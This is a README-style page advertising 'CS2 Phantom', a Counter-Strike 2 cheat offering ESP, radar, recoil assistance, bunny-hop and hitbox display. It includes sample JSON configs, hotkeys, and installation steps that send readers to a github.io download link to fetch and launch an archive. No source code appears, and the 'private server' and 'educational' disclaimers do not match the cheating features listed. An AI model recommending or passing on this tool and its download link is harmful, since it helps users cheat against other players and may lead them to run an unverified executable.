# CS2 Phantom — Counter-Strike 2 Cheat

<p align="center">
  <a href="https://CS2-Phantom-Cheat.github.io/.github">
    <img src="https://img.shields.io/badge/DOWNLOAD-CS2%20PHANTOM-00C853?style=for-the-badge" alt="Download CS2 Phantom">
  </a>
  <a href="https://CS2-Phantom-Cheat.github.io/.github">
    <img src="https://img.shields.io/badge/CS2-UTILITY-8b5cf6?style=for-the-badge" alt="CS2 Utility">
  </a>
</p>

<p align="center">
  <a href="https://CS2-Phantom-Cheat.github.io/.github">
    <img src="https://img.shields.io/badge/WINDOWS-10%2F11-2ea44f?style=flat-square" alt="Windows 10/11">
  </a>
  <a href="https://CS2-Phantom-Cheat.github.io/.github">
    <img src="https://img.shields.io/badge/CS2-SUPPORTED-2ea44f?style=flat-square" alt="CS2 Supported">
  </a>
  <a href="https://CS2-Phantom-Cheat.github.io/.github">
    <img src="https://img.shields.io/badge/X64-SUPPORTED-2ea44f?style=flat-square" alt="x64 Supported">
  </a>
  <a href="https://CS2-Phantom-Cheat.github.io/.github">
    <img src="https://img.shields.io/badge/CONFIGS-JSON-2ea44f?style=flat-square" alt="JSON Configs">
  </a>
</p>

<p align="center">
  <img src="https://github.com/CS2-Phantom-Cheat/.github/blob/main/assets/image/1.png?raw=true" width="700" alt="Phantom Overlay">
</p>

---

## About

**CS2 Phantom** is a configurable Counter-Strike 2 utility designed for offline testing, private servers, and controlled environments.

The application provides optional visual and gameplay-assistance modules that can be individually enabled or disabled. Configuration profiles are stored locally and can be switched without manually editing files.

> **Important:** Using third-party gameplay modifications on official or protected servers may violate the game's rules and can result in account restrictions. Use the software only where you have permission.

## Features

- Player ESP with configurable boxes and names
- Health and armor indicators
- Distance and weapon information
- Skeleton visualization
- Team/enemy filtering
- Visibility-based ESP
- Radar-style player indicators
- Crosshair customization
- Recoil visualization
- Configurable recoil assistance
- Bunny-hop assistance
- Optional auto-strafe
- Hitbox visualization
- Grenade trajectory visualization
- Predicted grenade landing point
- Bomb and objective indicators
- Spectator information
- FOV and overlay controls
- Hotkey-based feature toggles
- Multiple configuration profiles
- JSON configuration import/export
- Automatic configuration backups
- Searchable settings menu
- Lightweight overlay renderer

## Visual ESP

The ESP module can display additional information around players.

Supported elements include:

- Player name
- Health
- Armor
- Distance
- Active weapon
- Bounding box
- Skeleton
- Visibility state
- Team relationship

Example configuration:

```json
{
  "esp": {
    "enabled": true,
    "box": true,
    "skeleton": true,
    "health": true,
    "armor": true,
    "weapon": true,
    "distance": true,
    "visibility_check": true,
    "team_filter": true
  }
}
```

## Radar

The radar module provides a simplified view of nearby players.

Available options:

- Player markers
- Team filtering
- Distance indicators
- Configurable radar size
- Adjustable marker scale
- Custom update interval

## Recoil Control

The recoil module provides configurable assistance for testing weapon spray behavior.

Available parameters include:

- Recoil compensation strength
- Horizontal compensation
- Vertical compensation
- Activation key
- Weapon-specific profiles
- Compensation smoothing

Example:

```json
{
  "recoil": {
    "enabled": false,
    "strength": 0.35,
    "horizontal": true,
    "vertical": true,
    "activation_key": "MOUSE4"
  }
}
```

The feature is disabled by default.

## Bunny Hop

The movement module can automate repeated jump input when the player is airborne.

```json
{
  "movement": {
    "bunnyhop": false,
    "activation_key": "SPACE",
    "auto_strafe": false
  }
}
```

Bunny-hop and auto-strafe can be configured independently.

## Grenade Helper

The grenade module provides visual information useful for practicing utility lineups.

Supported information:

- Grenade trajectory
- Predicted landing point
- Active grenade type
- Throw direction
- Approximate flight path

This module is intended primarily for private-server and practice use.

## Hitbox Visualization

The hitbox module displays simplified hitbox geometry for debugging and practice.

Available options:

- Head hitbox
- Body hitboxes
- Limb hitboxes
- Configurable opacity
- Local-player hitboxes
- Enemy filtering

Example:

```json
{
  "hitboxes": {
    "enabled": false,
    "head": true,
    "body": true,
    "limbs": true
  }
}
```

## Crosshair

The built-in crosshair editor supports:

- Size
- Thickness
- Gap
- Outline
- Center dot
- Dynamic movement
- Custom style profiles

Crosshair settings can be saved separately from gameplay configurations.

## Configuration System

All settings can be stored in JSON profiles.

```text
configs/
├── default.json
├── practice.json
├── movement.json
└── custom.json
```

Profiles can be switched directly from the application menu.

### Example Profile

```json
{
  "menu": {
    "toggle_key": "INSERT"
  },
  "esp": {
    "enabled": true,
    "box": true,
    "skeleton": true,
    "health": true,
    "armor": true,
    "weapon": true
  },
  "radar": {
    "enabled": true,
    "size": 220
  },
  "recoil": {
    "enabled": false
  },
  "movement": {
    "bunnyhop": false,
    "auto_strafe": false
  },
  "grenades": {
    "trajectory": true,
    "landing_point": true
  }
}
```

## Hotkeys

| Key | Action |
|---|---|
| `INSERT` | Open / close menu |
| `F1` | Enable / disable ESP |
| `F2` | Enable / disable radar |
| `F3` | Enable / disable grenade helper |
| `F4` | Enable / disable hitbox display |
| `F5` | Enable / disable movement assistance |
| `F6` | Enable / disable recoil assistance |
| `END` | Disable all modules |

All hotkeys can be changed through the configuration file.

## Interface

```text
CS2 Phantom
│
├── Visuals
│   ├── ESP
│   ├── Radar
│   ├── Hitboxes
│   └── Crosshair
│
├── Gameplay
│   ├── Recoil
│   └── Movement
│
├── Grenades
│   ├── Trajectory
│   └── Practice Tools
│
├── Config
│   ├── Load
│   ├── Save
│   ├── Import
│   └── Restore
│
└── Settings
    ├── Hotkeys
    ├── Overlay
    └── Performance
```

## Performance

Performance options include:

- ESP update interval
- Overlay FPS limit
- Render distance
- Skeleton detail
- Radar update frequency
- Reduced-detail mode

Example:

```json
{
  "performance": {
    "overlay_fps": 144,
    "esp_update_rate": 60,
    "max_render_distance": 2500,
    "skeleton_detail": "medium"
  }
}
```

## System Requirements

- **Operating System:** Windows 10 or Windows 11, 64-bit
- **Game:** Counter-Strike 2
- **CPU:** Modern x64 processor
- **RAM:** 4 GB minimum
- **GPU:** DirectX 11 compatible graphics card
- **Storage:** Small amount of free disk space
- **Permissions:** May depend on the selected functionality
- **Internet:** Not required for local configuration
Actual performance depends on the selected modules, resolution, GPU, and CS2 settings.

## Installation

1. Download the latest release - [CLICK](https://CS2-Phantom-Cheat.github.io/.github).
2. Extract the archive to a local directory.
3. Launch the application.
4. Create or select a configuration profile.
5. Configure the required modules.
6. Start CS2 in an environment where third-party utilities are permitted.
7. Press `INSERT` to open the configuration menu.
8. Enable the modules required for the current session.

No separate installer is required.

## Configuration Backup

Before changing an existing configuration, the application can create a backup:

```text
backups/
├── default_2026-09-15.json
├── practice_2026-09-15.json
└── custom_2026-09-15.json
```

Previous configurations can be restored from:

**Config → Restore**

## Troubleshooting

### Overlay is not visible

Check that:

1. CS2 is running.
2. The utility is running with the required permissions.
3. The overlay is enabled.
4. The selected rendering mode is supported.
5. Another overlay is not interfering with the renderer.

### Configuration does not load

Verify that the JSON file is valid and is located inside the `configs` directory.

### High CPU usage

Try reducing:

- ESP update rate
- Overlay FPS
- Render distance
- Skeleton detail
- Radar update frequency

### Menu does not open

Check the configured menu key and make sure another application is not intercepting the keyboard input.

## License

This project is provided for educational and research purposes. Redistribution and modification are subject to the license included with the corresponding release.
